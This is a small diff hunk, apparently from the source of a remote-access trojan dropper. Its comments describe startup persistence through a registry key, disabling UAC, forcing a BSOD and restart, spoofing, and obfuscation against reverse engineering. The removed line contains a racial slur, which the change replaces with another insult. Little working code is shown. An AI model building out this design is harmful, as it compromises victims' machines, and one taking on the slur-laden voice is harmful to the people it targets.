@@ -15,7 +15,7 @@
 // how it works -> creats batch file with a custom command to execute our payload, creats reg key to add it to startup, disables uac, trigeers bsod and forces restart after a delay
 // and after spoofing to not be sus!
 
-bool isDone = false; // isDone = is done ratting, we will use this so ONLY when the rat is setup will we bsod that nigger.
+bool isDone = false; // isDone = is done ratting, we will use this so ONLY when the rat is setup will we bsod that skid.
 int zeor = 0; // for the shitcode later to make it harder to understand when reversing with IDA or similar pseudocode graph
 
 // i named most funcs with these goofy ahh names like DiskSpoofThread, GenerateSerialFromSeed, etc. these funcs aint codded by chatgpt 
